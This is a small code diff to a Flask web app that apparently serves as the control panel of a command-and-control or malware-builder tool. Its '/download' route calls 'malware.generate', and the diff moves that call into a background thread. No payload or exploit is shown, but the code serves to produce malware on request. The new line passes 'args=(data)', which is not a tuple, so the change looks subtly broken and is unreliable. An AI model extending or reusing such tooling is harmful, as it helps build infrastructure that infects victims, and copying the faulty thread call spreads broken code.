@@ -4,6 +4,7 @@ import socketio
 from c2 import C2
 import os
 import json
+import threading
 
 
 app = Flask(__name__)
@@ -79,7 +80,7 @@ def payload1():
 @app.route('/download', methods=['POST'])
 def download1():
     data = request.get_json()
-    malware.generate(data)
+    threading.Thread(target=malware.generate, args=(data)).start()
     return ""
 
 @app.route('/list_payloads', methods=['POST'])
